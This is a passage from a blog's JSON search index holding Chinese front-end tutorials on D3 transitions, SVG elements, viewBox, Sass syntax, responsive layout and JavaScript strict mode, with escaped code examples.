.duration(1000) .ease(&#x27;bounce&#x27;) .attr(&#x27;x&#x27;, 500).filter((data) =&gt; data === &#x27;Cat&#x27;).transition() .duration(600) .ease(&#x27;linear&#x27;) .each(&#x27;start&#x27;, function (data) &#123; // 动画开始 d3.select(this).text(data.toUpperCase()); &#125;) .each(&#x27;end&#x27;, function () &#123; // 动画结束 d3.select(this).text(&#x27;end&#x27;); &#125;) .each(&#x27;interrupt&#x27;, function () &#123; // 动画被打断 d3.select(this).text(&#x27;interrupt&#x27;); &#125;) .attr(&#x27;x&#x27;, 20);","categories":[{"name":"D3.js","slug":"D3-js","permalink":"https://xuxb.github.io/categories/D3-js/"}],"tags":[{"name":"D3.js","slug":"D3-js","permalink":"https://xuxb.github.io/tags/D3-js/"}]},{"title":"SVG 基础元素","slug":"SVG/SVG 基础元素","date":"2021-03-23T16:00:00.000Z","updated":"2021-04-28T02:34:15.251Z","comments":true,"path":"2021/03/24/SVG/SVG 基础元素/","link":"","permalink":"https://xuxb.github.io/2021/03/24/SVG/SVG%20%E5%9F%BA%E7%A1%80%E5%85%83%E7%B4%A0/","excerpt":"","text":"SVG 基础元素SVG 元素通用属性 transform 对基础图形进行变换处理（与 CSS3 中的 transform 属性有点不一致） 平移 translate(50,30) 缩放 scale(2) 旋转 rotate(30) 翻转 skewX()、skewY(10) fill：填充色 stroke：定义图形、文本等的边线颜色 说明：支持 hover 伪类、id、class 等 SVG 元素通用 CSS 样式 display: 控制元素是否可见（inline、none，所有元素的初始值都为 inline） fill: 填充色 fill-opacity: 填充色透明度 stroke: 定义图形、文本等的边线颜色 stroke-width: 定义图形、文字边线的宽度 stroke-opacity: 定义图形、文字边线的透明度 stroke-linecap：用来定义开放式路径的端点的样式（butt、round、square） stroke-linejoin：用来控制两个线段之间的联合是如何绘制 stroke-dasharray：用来创建虚线（如 stroke-dasharray=&quot;5,5&quot;） fill-rule：判断路径的哪一侧在路径所构成的形状的内部，从而判断fill属性如何给这个形状上色 文本SVG 文本 （&lt;text&gt;）说明：用来定义文字文本，例如 &lt;text&gt;测试文字&lt;/text&gt; 支持的样式：font-family，font-style，font-weight，font-variant，font-stretch，font-size，font-size-adjust，kerning，letter-spacing，word-spacing 和 text-decoration 内联文本 （&lt;tspan&gt;）说明：嵌套在 &lt;text&gt; 标签中，与 &lt;span&gt; 标签类似，用于定义一组文本的样式 文本路径 （&lt;textPath&gt;）说明：嵌套在 &lt;text&gt; 标签中，使文字按照指定路径排列，放在 &lt;text&gt; 标记内部引用预定义的 &lt;path&gt;，引用时，使用 xlink:href 属性指明需要引用的路径的 ID 链接 （&lt;a&gt;）说明：创建一个 SVG 元素链接 xlink:show xlink:actuate xlink:href target 123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;title&gt;SVG 学习&lt;/title&gt; &lt;style&gt; * &#123; margin: 0; padding: 0; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;svg width=&quot;800&quot; height=&quot;400&quot; style=&quot;border: 1px solid #aaa;&quot;&gt; &lt;defs&gt; &lt;path id=&quot;MyPath&quot; d=&quot;M 100 200 C 200 100 300 0 400 100 C 500 200 600 300 700 200 C 800 100 900 100 900 100&quot; /&gt; &lt;/defs&gt; &lt;a xlink:href=&quot;https://www.baidu.com&quot; target=&quot;_blank&quot;&gt; &lt;text x=&quot;100&quot; y=&quot;15&quot; style=&quot;fill: #009; cursor: pointer;&quot;&gt; 打开百度&lt;/text&gt; &lt;/a&gt; &lt;text x=&quot;0&quot; y=&quot;15&quot; style=&quot;fill: red;&quot; transform=&quot;rotate(30 20, 30)&quot;&gt; Just test SVG! &lt;tspan style=&quot;fill: #0f0; font-size: 26px; font-style: italic;&quot;&gt;中国人民银行&lt;/tspan&gt; nothing nothing nothing &lt;/text&gt; &lt;text&gt; &lt;textPath xlink:href=&quot;#MyPath&quot;&gt; SVG 基本功能测试基本功能测试基本功能测试基本功能测试基本功能测试 &lt;/textPath&gt; &lt;/text&gt; &lt;/svg&gt;&lt;/body&gt;&lt;/html&gt; 基本图形矩形（&lt;rect&gt;） x: 元素距离左边的距离 y: 元素距离上边的距离 width: 元素的宽度 height: 元素的高度 rx: 矩形 X 轴方向的半径 rx: 矩形 Y 轴方向的半径 圆形 （&lt;circle&gt;） cx: 圆心距离 Y 轴的距离 cy: 圆心距离 X 轴的距离 r: 圆的半径 椭圆（&lt;ellipse&gt;） cx: 圆心距离 Y 轴的距离 cy: 圆心距离 X 轴的距离 rx: 圆的 X 轴的半径 ry: 圆的 Y 轴的半径 直线（&lt;line&gt;） x1: X 轴方向的起点 y1: Y 轴方向的起点 x2: X 轴方向的终点 y2: Y 轴方向的终点 折线 （&lt;polyline&gt;） points 属性里定义了各个点的坐标，x 和 y 坐标之间用逗号分别，多个坐标之间用空格分割 例如 &lt;polyline points=&quot;3,3 10,40 50,100 20,150&quot;/&gt; 多边形 （&lt;polygen&gt;） points 属性里定义了各个点的坐标，x 和 y 坐标之间用逗号分别，多个坐标之间用空格分割，并组成闭合的环形 路径 （&lt;path&gt;） d 用于定义一系列指令，例如 &lt;path d=&quot;M150 0 L75 200 L225 200 Z&quot; /&gt; 指令 参数 名称 描述 M x,y moveto 移动到 移动虚拟画笔到指定的（x,y）坐标，仅移动不绘制 m x,y moveto 同M，但使用相对坐标 L x,y lineto 连直线到 从当前画笔所在位置绘制一条直线到指定的（x,y）坐标 l x,y lineto 同L，但使用相对坐标 H x horizontal lineto 水平连线到 绘制一条水平直线到参数指定的x坐标点，y坐标为画笔的y坐标 h x horizontal lineto 同H，但使用相对坐标 V y vertical lineto 垂直连线到 从当前位置绘制一条垂直直线到参数指定的y坐标 v y vertical lineto 同V，但使用相对坐标 C x1,y1 x2,y2 x,y curveto 三次方贝塞尔曲线 从当前画笔位置绘制一条三次贝兹曲线到参数（x,y）指定的坐标。x1，y1和x2,y2是曲线的开始和结束控制点，用于控制曲线的弧度 c x1,y1 x2,y2 x,y curveto 同C，但使用相对坐标 S x2,y2 x,y shorthand 平滑三次方贝塞尔曲线 从当前画笔位置绘制一条三次贝塞尔曲线到参数（x,y）指定的坐标。x2,y2是结束控制点。开始控制点和前一条曲线的结束控制点相同 s x2,y2 x,y shorthand 平滑三次方贝塞尔曲线 同S，但使用相对坐标 Q x1,y1 x,y 二次方贝塞尔曲线 从当前画笔位置绘制一条二次方贝塞尔曲线到参数（x,y）指定的坐标。x1,y1是控制点，用于控制曲线的弧度 q x1,y1 x,y 二次方贝塞尔曲线 同Q，但使用相对坐标 T x,y 平滑的二次贝塞尔曲线 从当前画笔位置绘制一条二次贝塞尔曲线到参数（x,y）指定的坐标。控制点被假定为最后一次使用的控制点 t x,y 平滑的二次贝塞尔曲线 同T，但使用相对坐标 A rx,ry x-axis-rotation large-arc-flag,sweepflag x,y 椭圆弧线 从当前画笔位置开始绘制一条椭圆弧线到（x,y）指定的坐标。rx和ry分别为椭圆弧线水平和垂直方向上的半径。x-axis-rotation指定弧线绕x轴旋转的度数。它只在rx和ry的值不相同是有效果。large-arc-flag是大弧标志位，取值0或1，用于决定绘制大弧还是小弧。sweep-flag用于决定弧线绘制的方向 a rx,ry x-axis-rotation large-arc-flag,sweepflag x,y 椭圆弧线 同A，但使用相对坐标 Z 无 闭合路径 从结束点绘制一条直线到开始点，闭合路径 z 无 闭合路径 同Z 12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;title&gt;SVG 学习&lt;/title&gt; &lt;style&gt; * &#123; margin: 0; padding: 0; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;svg width=&quot;400&quot; height=&quot;400&quot; style=&quot;border: 1px solid #999;&quot;&gt; &lt;rect x=&quot;20&quot; y=&quot;40&quot; width=&quot;200&quot; height=&quot;200&quot; rx=&quot;20&quot; ry=&quot;30&quot; style=&quot;fill: #009;stroke: #f00; stroke-width: 2; fill-opacity: 0.5; stroke-opacity: 5.2&quot;/&gt; &lt;circle cx=&quot;290&quot; cy=&quot;60&quot; r=&quot;40&quot; style=&quot;fill: #0f0; fill-opacity: .4;&quot;/&gt; &lt;ellipse cx=&quot;300&quot; cy=&quot;150&quot; rx=&quot;60&quot; ry=&quot;40&quot; style=&quot;fill: #900; stroke: #999; stroke-width: 3; stroke-opacity: .5;&quot;/&gt; &lt;line x1=&quot;240&quot; y1=&quot;220&quot; x2=&quot;395&quot; y2=&quot;220&quot; style=&quot;stroke: #333; stroke-width: 2;&quot;/&gt; &lt;polyline points=&quot;3,3 10,40 50,100 20,150 20,180 50,180 50,210 80,210 110,210&quot; style=&quot;fill:none; stroke:#099; stroke-width: 1&quot;/&gt; &lt;polygon points=&quot;110, 20 30, 40 80, 50&quot; style=&quot;fill: #934;&quot;/&gt; &lt;polygon points=&quot;100,10 40,198 190,78 10,78 160,198&quot; style=&quot;fill:lime;stroke:purple;stroke-width:5;fill-rule:evenodd;&quot; /&gt; &lt;path d=&quot;M 175 200 l 150 0&quot; stroke=&quot;green&quot; stroke-width=&quot;3&quot; fill=&quot;none&quot; /&gt; &lt;path d=&quot;M 100 350 q 150 -300 300 0&quot; stroke=&quot;blue&quot; stroke-width=&quot;5&quot; fill=&quot;none&quot; /&gt; &lt;/svg&gt;&lt;/body&gt;&lt;/html&gt; 结构元素分组 （&lt;g&gt;）说明：&lt;g&gt; 用于分组，它能把多个元素放在一组里，对 &lt;g&gt; 标记的样式和渲染会作用到这个分组内的所有元素上。组内的所有元素都会继承 &lt;g&gt; 标记上的所有属性。用 &lt;g&gt; 定义的分组还可以使用 &lt;use&gt; 进行复制使用。 123456789101112131415161718192021&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;title&gt;SVG 学习&lt;/title&gt; &lt;style&gt; * &#123; margin: 0; padding: 0; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;svg width=&quot;400&quot; height=&quot;300&quot; style=&quot;border: 1px solid #999;&quot;&gt; &lt;g style=&quot;fill: red; stroke: #090; stroke-width: 2;&quot;&gt; &lt;circle r=&quot;40&quot; cx=&quot;180&quot; cy=&quot;140&quot;&gt;&lt;/circle&gt; &lt;rect x=&quot;30&quot; y=&quot;40&quot; width=&quot;100&quot; height=&quot;50&quot;&gt;&lt;/rect&gt; &lt;rect x=&quot;230&quot; y=&quot;40&quot; width=&quot;100&quot; height=&quot;50&quot;&gt;&lt;/rect&gt; &lt;/g&gt; &lt;/svg&gt;&lt;/body&gt;&lt;/html&gt; 复制 （&lt;use&gt;）说明：&lt;use&gt; 能从 SVG 文档内部取出一个节点，克隆它，并把它输出到别处。子元素能继承来自 &lt;use&gt; 样式 12345678910111213141516171819202122232425262728&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;title&gt;SVG 学习&lt;/title&gt; &lt;style&gt; * &#123; margin: 0; padding: 0; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;svg width=&quot;400&quot; height=&quot;300&quot; style=&quot;border: 1px solid #999;&quot;&gt; &lt;defs&gt; &lt;g id=&quot;shape&quot; style=&quot;fill: inherit; stroke: #090; stroke-width: 2;&quot;&gt; &lt;circle r=&quot;40&quot; cx=&quot;180&quot; cy=&quot;140&quot;&gt;&lt;/circle&gt; &lt;rect x=&quot;30&quot; y=&quot;40&quot; width=&quot;100&quot; height=&quot;50&quot;&gt;&lt;/rect&gt; &lt;rect x=&quot;230&quot; y=&quot;40&quot; width=&quot;100&quot; height=&quot;50&quot;&gt;&lt;/rect&gt; &lt;/g&gt; &lt;/defs&gt; &lt;text y=&quot;15&quot;&gt;图形1&lt;/text&gt; &lt;use x=&quot;20&quot; y=&quot;20&quot; xlink:href=&quot;#shape&quot; style=&quot;fill: #009;&quot;&gt;&lt;/use&gt; &lt;/svg&gt;&lt;/body&gt;&lt;/html&gt; 模板（）&lt;symbol&gt; 的作用是定义一个图像模板，使用 &lt;use&gt; 标记实例化它，然后在 SVG 文档中反复使用。&lt;symbol&gt; 本身不会输出任何图像，只有使用 &lt;use&gt; 实例化后才会显示。 12345678910111213141516171819202122232425262728&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;title&gt;SVG 学习&lt;/title&gt; &lt;style&gt; * &#123; margin: 0; padding: 0; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;svg width=&quot;400&quot; height=&quot;300&quot; style=&quot;border: 1px solid #999;&quot;&gt; &lt;!-- symbol definition NEVER draw --&gt; &lt;symbol id=&quot;sym01&quot; viewBox=&quot;0 0 150 110&quot;&gt; &lt;circle cx=&quot;50&quot; cy=&quot;50&quot; r=&quot;40&quot; stroke-width=&quot;8&quot; stroke=&quot;red&quot; fill=&quot;red&quot; /&gt; &lt;circle cx=&quot;90&quot; cy=&quot;60&quot; r=&quot;40&quot; stroke-width=&quot;8&quot; stroke=&quot;green&quot; fill=&quot;white&quot; /&gt; &lt;/symbol&gt; &lt;!-- actual drawing by &quot;use&quot; element --&gt; &lt;use xlink:href=&quot;#sym01&quot; x=&quot;0&quot; y=&quot;0&quot; width=&quot;100&quot; height=&quot;50&quot; /&gt; &lt;use xlink:href=&quot;#sym01&quot; x=&quot;0&quot; y=&quot;50&quot; width=&quot;75&quot; height=&quot;38&quot; /&gt; &lt;use xlink:href=&quot;#sym01&quot; x=&quot;0&quot; y=&quot;100&quot; width=&quot;50&quot; height=&quot;25&quot; /&gt; &lt;/svg&gt;&lt;/body&gt;&lt;/html&gt;","categories":[{"name":"SVG","slug":"SVG","permalink":"https://xuxb.github.io/categories/SVG/"}],"tags":[{"name":"SVG","slug":"SVG","permalink":"https://xuxb.github.io/tags/SVG/"}]},{"title":"viewBox 与 preserveAspectRatio","slug":"SVG/viewBox 与 preserveAspectRatio","date":"2021-03-23T16:00:00.000Z","updated":"2021-04-28T02:34:28.817Z","comments":true,"path":"2021/03/24/SVG/viewBox 与 preserveAspectRatio/","link":"","permalink":"https://xuxb.github.io/2021/03/24/SVG/viewBox%20%E4%B8%8E%20preserveAspectRatio/","excerpt":"","text":"viewBox 与 preserveAspectRatio视窗（viewport）视窗是指一块 SVG 可见的区域 如 &lt;svg width=&quot;500&quot; height=&quot;300&quot;&gt;&lt;/svg&gt; 定义了一个视区，宽 500 单位，高 300 单位（并没有指定是像素，也可以指定为 em、rem 等） 当 width 、 height 如果是纯数字，使用的就是 “像素” 作为单位的，SVG 中的其他子元素也是相同的原理 视图盒子（viewBox）viewBox 属性相当于给 svg 图像设置了一个选区，然后将这个选区填充到整个 svg 画布中，最后的看到的结果就是选区中的图像缩放后的结果。 这个属性有四个值，分别为坐标系统中的x值，y值，宽度，高度，属性值之间用空格或者是逗号合开。 实际上这 4 个值唯一的确定了一个矩形和矩形的位置，x值和y值是矩形左上角顶点的坐标，宽和高分别是矩形的宽和高，单位为像素，这个矩形就是上述的选区。 123&lt;svg width=&quot;400&quot; height=&quot;300&quot; viewBox=&quot;0,0,40,30&quot; style=&quot;border:1px solid #cd0000;&quot;&gt; &lt;rect x=&quot;10&quot; y=&quot;5&quot; width=&quot;20&quot; height=&quot;15&quot; fill=&quot;#cd0000&quot;/&gt;&lt;/svg&gt; preserveAspectRatiopreserveAspectRatio=&quot;xMidYMid meet&quot; xMidYMid：表示 viewBox 如何与 viewport 对齐 meet：表示如何维持高宽比 值 含义 xMin viewport 和 viewBox 左边对齐 xMid viewport 和 viewBox x 轴中心对齐 xMax viewport 和 viewBox 右边对齐 YMin viewport 和 viewBox 上边缘对齐 YMid viewport 和 viewBox y 轴中心点对齐 YMax viewport 和 viewBox 下边缘对齐 值 含义 meet 保持纵横比缩放 viewBox 适应 viewport slice 保持纵横比同时比例小的方向放大填满 viewport none 扭曲纵横比以充分适应 viewport","categories":[{"name":"SVG","slug":"SVG","permalink":"https://xuxb.github.io/categories/SVG/"}],"tags":[{"name":"SVG","slug":"SVG","permalink":"https://xuxb.github.io/tags/SVG/"}]},{"title":"Sass 基础语法","slug":"Sass/Sass 基础语法","date":"2021-03-23T16:00:00.000Z","updated":"2021-04-28T02:28:59.023Z","comments":true,"path":"2021/03/24/Sass/Sass 基础语法/","link":"","permalink":"https://xuxb.github.io/2021/03/24/Sass/Sass%20%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/","excerpt":"","text":"1、 FIS3 中集成 Sass1.1 插件安装 sass 编译 npm i fis3-parser-node-sass -g 前缀添加 npm i fis3-preprocessor-cssprefixer -g 必须全局安装 1234567891011121314fis.match(&#x27;*.scss&#x27;, &#123; parser: fis.plugin(&#x27;node-sass&#x27;), rExt: &#x27;css&#x27;, release: &#x27;$0&#x27;&#125;);fis.match(&#x27;_*.scss&#x27;, &#123; release: false&#125;);fis.match(&#x27;*.scss&#x27;, &#123; preprocessor: fis.plugin(&#x27;cssprefixer&#x27;, &#123; &quot;browsers&quot;: [&quot;Android &gt;= 2.1&quot;, &quot;iOS &gt;= 4&quot;, &quot;ie &gt;= 8&quot;, &quot;firefox &gt;= 15&quot;], &quot;cascade&quot;: true &#125;)&#125;); 1.2 目录规范 base _reset.scss _typography.scss helpers _function.scss _mixin.scss _variable.scss components _header.scss _footer.scss _buttons.scss _cards.scss layouts _responsive.scss pages _page1.scss _page2.scss lib bootstrap.scss font-awesome.scss main.scss 1.3 编码规范1.3.1 Sass 性能优化 用 class 分类代替子代选择器 建议用子选择器，而不是后代选择器，提高性能 特殊类别选择属性选择器 1.3.2 Sass 属性声明顺序 z-index, display position, left, top, right, bottom overflow, float, clear margin, padding background, border font, text scss 代码块应有的顺序 1.3.2 Sass 使用规则 当前选择器的样式属性 父级选择器的伪类选择器 (:first-letter, :hover, :active) 伪类元素 (:before、:after) 父级选择器的声明样式 (.selected, .active, .enlarged) 用 Sass 的上下文媒体查询 子选择器作为最后的部分 2、 Sass 语法说明2.1 后缀名 Sass文件后缀名可为 .scss、 .sass 推荐使用 .scss，与 css 语法完全兼容 不推荐使用 .sass 要求更严格，不能使用 &#123;&#125; 和 ; 2.2 文件导入 可在 Sass 文件中导入 Sass 文件或 css 文件 （对于 Sass 文件可不写后缀名） 基础文件以 _ 开头，如变量声明、混入等，（导入时可不写下划线） 示例： @import &quot;page/page1&quot; @import &quot;lib/bootstrap.css&quot; 2.3 变量 使用 $ 声明并使用变量 变量可被覆盖（就近原则或在变量后面添加 !default） 变量可为全局或局部 （在选择器外部声明、选择器内部声明） 当变量为字符串时，可在类名、属性名中引用，如 border-#&#123;$variableName&#125; 变量为 list 结构 （在 $size: 18px 30px 34px 使用 nth($size, 1) 调用） 变量为 map 结构（使用 @each $key, $value in $map 调用） 123456789101112131415161718192021$gray: #666 !default;$directory: top;$size: 18px 30px 34px;$heading: (h1: #0aa, h2: #cc0, h3: #b0b);body &#123; color: #f00; a &#123; font-size: nth($size, 1); color: $gray; border-#&#123;$directory&#125;: 1 px solid $gray; &amp;:hover &#123; $font-size: 40 px; font-size: $font-size; &#125; &#125; @each $head, $color in $heading &#123; #&#123;$head&#125; &#123; color: $color; &#125; &#125;&#125; 2.4 嵌套 可使用选择器嵌套、属性嵌套 （属性嵌套并没什么用） @at-root 可跳出所有的上级选择器 （可同时对过个选择器操作） #&#123;&amp;&#125;__modifer 可实现 BEM 特性 123456789101112131415161718// 编译前的 scss 文件.footer &#123; font-size: 16px; @at-root #&#123;&amp;&#125;__modifer &#123; color: #333 &#125; @at-root .nav &amp; &#123; color: #f0f; &#125; @at-root &#123; .child1 &#123; color: #f00; &#125; .child2 &#123; color: #ff0; &#125; &#125;&#125; 1234567891011121314151617181920// 编译后的 css 文件.footer &#123; font-size: 16px;&#125;.footer__modifer &#123; color: #333;&#125;.nav .footer &#123; color: #f0f;&#125;.child1 &#123; color: #f00;&#125;.child2 &#123; color: #ff0;&#125; 2.4 占位选择器 使用 % 声明占位选择器， 通过 @extend 调用占位选择器 当占位选择器没被调用时，不会被解析出来 （推荐使用） 占位选择器可以用其定义一些基础的样式文件 123456789// 编译前的 scss 文件% my-sty &#123; color: #aaa; font-size: 10px;&#125;.child-1 &#123; @extend %my-sty;&#125; 12345// 编译后的 css 文件.child1 &#123; color: #aaa; font-size: 10px;&#125; 2.5 继承说明：继承是建立在语义化的关系上。当一个元素拥有的类（如 .seriousError ）表明它属于另一个类（如 .error），此时适合用继承 使用 %extend 进行继承 可以继承任何定义给单个元素的选择器，比如 .special.cool、a:hover 1234567// 编译前a:hover &#123; text-decoration: underline;&#125;.hoverlink &#123; @extend a: hover;&#125; 1234// 编译后a:hover, .hoverlink &#123; text-decoration: underline;&#125; 123456789// 编译前.error &#123; border: 1px #f00; background-color: #fdd;&#125;.seriousError &#123; @extend .error; border-width: 3px;&#125; 123456789// 编译后.error, .seriousError &#123; border: 1px #f00; background-color: #fdd;&#125;.seriousError &#123; border-width: 3px;&#125; 123456789101112// 编译前.error &#123; border: 1px #f00; background-color: #fdd;&#125;.error.intrusion &#123; background-image: url(&quot;/image/hacked.png&quot;);&#125;.seriousError &#123; @extend .error; border-width: 3px;&#125; 1234567891011// 编译后.error, .seriousError &#123; border: 1px #f00; background-color: #fdd;&#125;.error.intrusion, .intrusion.seriousError &#123; background-image: url(&quot;/image/hacked.png&quot;);&#125;.seriousError &#123; border-width: 3px;&#125; 2.6 混合说明：混合指令用于定义可重复的样式，避免使用无语义的 class，如 .clearfix、.float-left 使用 @mixin 声明混合指令，通过 @include 调用混合指令 当混合没被调用时，不会被解析出来 （推荐使用） 混合样式中也可以嵌套其他混合样式 当混合为无参时，推荐使用占位选择器来实现 1234567891011121314151617// 编译前的 scss 文件@mixin ellipsis ($width: 100px) &#123; overflow: hidden; white-space: nowrap; text-overflow: ellipsis; width: $width;&#125;.text-ellipsis &#123; color: #0ff; @include ellipsis;&#125;.text2-ellipsis &#123; color: #999; @include ellipsis($width: 300px);&#125; 12345678910111213141516// 编译后的 css 文件.text-ellipsis &#123; color: #0ff; overflow: hidden; white-space: nowrap; text-overflow: ellipsis; width: 100px;&#125;.text2-ellipsis &#123; color: #999; overflow: hidden; white-space: nowrap; text-overflow: ellipsis; width: 300px;&#125; 1234567891011121314151617// 编译前@mixin height-light &#123; background: #fc0;&#125;@mixin head-text &#123; font-size: 24px;&#125;@mixin computed &#123; @include height-light; @include head-text;&#125;span &#123; @include computed&#125; 12345// 编译后span &#123; background: #fc0; font-size: 24px;&#125; 2.7 函数 使用 @fuction funName (param) &#123;&#125; 声明，通过 funName() 调用 可使用 sass 自带的函数，如 lighten()、darken() 等 1234567891011121314151617// 编译前的 scss 文件@function addSize ($size) &#123; $baseSize: 12px; @return $baseSize+$size;&#125;.link-1 &#123; $blue: #00A3CF; font-size: addSize(10px); color: darken($blue, 25%);&#125;.link-2 &#123; $blue: #00A3CF; font-size: addSize(10px); color: lighten($blue, 20%);&#125; 12345678910// 编译后的 css 文件.link-1 &#123; font-size: 22px; color: #003f50;&#125;.link-2 &#123; font-size: 22px; color: #36d4ff;&#125; 2.8 其他 运算 可对遍历、数值、像素、颜色等进行四则运算（操作符前后需要空格） 三目运算 条件为真/假时，返回不同的值 （与函数有点类似） @if 条件成立后执行 &#123;&#125; 内的语句 @each 遍历 list 变量、map 变量 @for 在指定数值范围内遍历 1234567891011121314151617181920212223242526// sass 运算、 @if、三目运算 示例// 编译前的 scss 文件$hasSubMenu: true;$level: 2;.wrapper &#123; color: if($hasSubMenu, #f00, #00f); @if $hasSubMenu &#123; background-image: url(&#x27;/images/down-icon.jpg&#x27;); &#125; @if $level==2 &#123; height: 60px * 2; background: #f0f; &#125; @else if $level==3 &#123; height: 60px * 3; background: #f00; &#125;&#125;// 编译后的 css 文件.wrapper &#123; background-image: url(&quot;/images/down-icon.jpg&quot;); height: 120px; color: #f00; background: #f0f;&#125; 123456789101112131415161718192021// @each 示例// 编译前的 scss 文件$animal-list: puma, sea-slug, egret;@each $animal in $animal-list &#123; .#&#123;$animal&#125;-icon &#123; background-image: url(&#x27;/images/#&#123;$animal&#125;.png&#x27;); &#125;&#125;// 编译后的 css 文件.puma-icon &#123; background-image: url(&quot;/images/puma.png&quot;);&#125;.sea-slug-icon &#123; background-image: url(&quot;/images/sea-slug.png&quot;);&#125;.egret-icon &#123; background-image: url(&quot;/images/egret.png&quot;);&#125; 12345678910111213141516171819202122// @for 示例// 编译前的 scss 文件@for $i from 1 to 4 &#123; .content-#&#123;$i&#125; &#123; font-size: &#123; font-size: 14px + $i * 2px; &#125; &#125;&#125;// 编译后的 css 文件.content-1 &#123; font-size: 16px;&#125;.content-2 &#123; font-size: 18px;&#125;.content-3 &#123; font-size: 20px;&#125;","categories":[{"name":"CSS","slug":"CSS","permalink":"https://xuxb.github.io/categories/CSS/"},{"name":"Sass","slug":"CSS/Sass","permalink":"https://xuxb.github.io/categories/CSS/Sass/"}],"tags":[{"name":"CSS","slug":"CSS","permalink":"https://xuxb.github.io/tags/CSS/"},{"name":"Sass","slug":"Sass","permalink":"https://xuxb.github.io/tags/Sass/"}]},{"title":"Sass 技巧篇","slug":"Sass/Sass 技巧篇","date":"2021-03-23T16:00:00.000Z","updated":"2021-04-28T02:29:04.442Z","comments":true,"path":"2021/03/24/Sass/Sass 技巧篇/","link":"","permalink":"https://xuxb.github.io/2021/03/24/Sass/Sass%20%E6%8A%80%E5%B7%A7%E7%AF%87/","excerpt":"","text":"数据类型 数字，1, 2, 13, 10px 字符串，有引号字符串与无引号字符串，”foo”, ‘bar’, baz 颜色，blue, #04a3f9, rgba(255,0,0,0.5) 布尔型，true, false 空值，null 数组 (list)，用空格或逗号作分隔符，1.5em 1em 0 2em, Helvetica, Arial, sans-serif maps, 相当于 JavaScript 的 object，(key1: value1, key2: value2)","categories":[{"name":"CSS","slug":"CSS","permalink":"https://xuxb.github.io/categories/CSS/"},{"name":"Sass","slug":"CSS/Sass","permalink":"https://xuxb.github.io/categories/CSS/Sass/"}],"tags":[{"name":"CSS","slug":"CSS","permalink":"https://xuxb.github.io/tags/CSS/"},{"name":"Sass","slug":"Sass","permalink":"https://xuxb.github.io/tags/Sass/"}]},{"title":"响应式设计","slug":"CSS/响应式设计","date":"2021-03-21T16:00:00.000Z","updated":"2021-04-28T02:23:55.570Z","comments":true,"path":"2021/03/22/CSS/响应式设计/","link":"","permalink":"https://xuxb.github.io/2021/03/22/CSS/%E5%93%8D%E5%BA%94%E5%BC%8F%E8%AE%BE%E8%AE%A1/","excerpt":"","text":"响应式设计一、常见布局 固定布局：以像素为基本单位，只设计一套尺寸，不管浏览器宽度； 响应式布局：以像素为基本单位，设计多套尺寸，不同分辨率下页面样式有所不同； 弹性布局：以百分比作为基本单位，可以适应一定范围内的所有浏览器宽度，并以最佳的样式展示页面信息； 混合布局：混合像素、和百分比两种单位作为页面单位，和弹性布局类似； 二. 响应式布局原理本质：页面中的整体布局不变化，各模块中的内容发生变化，主要有三种 压缩 —- 拉伸； 平铺 —- 换行； 添加 —- 删除； 三. 实现响应式布局的方法 CSS media query 流体布局 （百分比宽度） 弹性布局 （display：flex） javascript 操作 DOM","categories":[{"name":"CSS","slug":"CSS","permalink":"https://xuxb.github.io/categories/CSS/"}],"tags":[{"name":"CSS","slug":"CSS","permalink":"https://xuxb.github.io/tags/CSS/"}]},{"title":"严格模式","slug":"JavaScript/严格模式","date":"2021-03-17T12:24:48.000Z","updated":"2021-04-30T06:40:59.690Z","comments":true,"path":"2021/03/17/JavaScript/严格模式/","link":"","permalink":"https://xuxb.github.io/2021/03/17/JavaScript/%E4%B8%A5%E6%A0%BC%E6%A8%A1%E5%BC%8F/","excerpt":"","text":"严格模式严格模式对正常的 JavaScript语义做了一些更改。 严格模式消除了一些 JavaScript 的静默错误，通过改变它们来抛出错误。 严格的模式修复了 JavaScript 引擎难以执行优化的错误，严格模式代码应该比非严格模式的相同的代码运行得更快。 严格模式禁用了在 ECMAScript 的未来版本中可能会定义的一些语法。 1、严格模式下无法再意外创建全局变量123name = 23; // 23&quot;use strict&quot;;name = 23; // Uncaught ReferenceError: name is not defined 2、严格模式会使引起静默失败(不报错也没有任何效果)的赋值操抛出异常说明：在正常模式下, 给 NaN 赋值不会产生任何作用，开发者也不会受到任何错误反馈. 但在严格模式下, 给 NaN 赋值会抛出一个异常。任何在正常模式下引起静默失败的赋值操作 (给不可写属性赋值, 给只读属性(getter-only)赋值赋值, 给不可扩展对象(non-extensible object)的新属性赋值) 都会抛出异常 123NaN = 1; // 23&quot;use strict&quot;;NaN = 1; // Uncaught TypeError: Cannot assign to read only property &#x27;NaN&#x27; of object &#x27;#&lt;Window&gt;&#x27; 3、试图删除不可删除的属性时会抛出异常123delete Object.prototype; // false &quot;use strict&quot;;delete Object.prototype; // Uncaught TypeError: Cannot delete property &#x27;prototype&#x27; of function Object() &#123; [native code] &#125; 4、严格模式下禁止 this 关键字指向全局对象（函数调用与构造函数中）5、严格模式禁用 with，否则会导致报错（便于编译器优化代码）6、严格模式下的 eval 不再为上层范围引入新变量7、严格模式禁止删除声明的变量8、严格模式禁止使用 arguments.callee9、严格模式下，参数的值不会随 arguments 对象的值的改变而变化12345678function f(a)&#123; &quot;use strict&quot;; a = 42; return [a, arguments[0]];&#125;var pair = f(17);console.assert(pair[0] === 42);console.assert(pair[1] === 17); // arguments[0] 为传入的值且不再改变","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://xuxb.github.io/categories/JavaScript/"}],"tags":[{"name":"JavaScript 基础","slug":"JavaScript-基础","permalink":"https://xuxb.github.io/tags/JavaScript-%E5%9F%BA%E7%A1%80/"}]},{"title":"EventEmitter 实现原理","slug":"JavaScript 编程题/EventEmitter 